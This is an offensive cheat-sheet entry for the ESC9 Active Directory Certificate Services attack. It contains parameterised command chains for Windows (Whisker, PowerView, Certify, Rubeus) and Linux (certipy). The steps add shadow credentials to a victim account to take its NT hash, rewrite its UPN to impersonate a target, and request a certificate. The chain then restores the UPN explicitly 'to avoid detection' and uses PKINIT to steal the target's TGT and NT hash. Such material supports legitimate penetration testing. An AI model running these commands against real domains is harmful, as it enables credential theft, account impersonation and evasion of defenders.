---
technique: ESC9 - No Security Extension
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc9 certificate-services pkinit
---

# ESC9 - No Security Extension

ESC9 abuses templates that omit the SID security extension, usually by rewriting a victim UPN before requesting a certificate.

## Windows

### ESC9: Step 1: add shadow credentials (Whisker)

#powershell #whisker #shadow-credentials

Add shadow credentials to the victim account to get their NT hash for subsequent steps.

```powershell title:"ESC9: add shadow credentials to victim via Whisker"
.\Whisker.exe add /target:"$victim_user" /domain:"$domain" /dc:"$dc_name" /path:"shadow.pfx" /password:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
var pfx_pass
-->

### ESC9: Step 2: rewrite victim UPN to target (PowerView)

#powershell #powerview #no-sid-extension #upn-swap

Rewrite the victim's UPN to match the target user so the issued cert maps to the target principal.

```powershell title:"ESC9: set victim UPN to target user"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$target_user'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
var target_user
-->

### ESC9: Step 3: request cert as victim (Certify)

#powershell #certify #no-sid-extension

Request a cert from the no-security-extension template while the victim's UPN maps to the target.

```powershell title:"ESC9: request cert as victim on no-security-extension template"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC9: Step 4: restore victim UPN (PowerView)

#powershell #powerview #no-sid-extension #upn-swap

Restore the victim's original UPN to avoid detection.

```powershell title:"ESC9: restore victim UPN to original value"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC9: Step 5: PKINIT as target (Rubeus)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the issued cert to obtain the target's TGT and NT hash.

```powershell title:"ESC9: PKINIT with issued cert to get target TGT and hash"
.\Rubeus.exe asktgt /getcredentials /certificate:"$cert_b64" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_name" /show
```
<!-- cheat
import domain_ip
import users
var dc_name
var pfx_pass
var cert_b64
-->

## Linux

### ESC9: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #no-sid-extension

Get the victim's NT hash via shadow credentials so they can be impersonated during cert request.

```sh title:"ESC9: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC9: Step 2: rewrite victim UPN to target (certipy)

#certipy #no-sid-extension #upn-swap

Rewrite the victim's UPN to the target user so the issued cert maps to the target principal.

```sh title:"ESC9: update victim UPN to target user"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $target_user -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
var target_user
-->

### ESC9: Step 3: request cert as victim (certipy)

#certipy #no-sid-extension

Request a cert using victim's Kerberos ticket while their UPN maps to the target user.

```sh title:"ESC9: request cert as victim using Kerberos ticket"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
var template_name
-->

### ESC9: Step 4: restore victim UPN (certipy)

#certipy #no-sid-extension #upn-swap

Restore the victim's original UPN.

```sh title:"ESC9: restore victim UPN to original value"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC9: Step 5: PKINIT as target (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the target's TGT and NT hash.

```sh title:"ESC9: PKINIT as target user with issued cert"
certipy auth -pfx $target_user.pfx -domain $domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
var target_user
-->
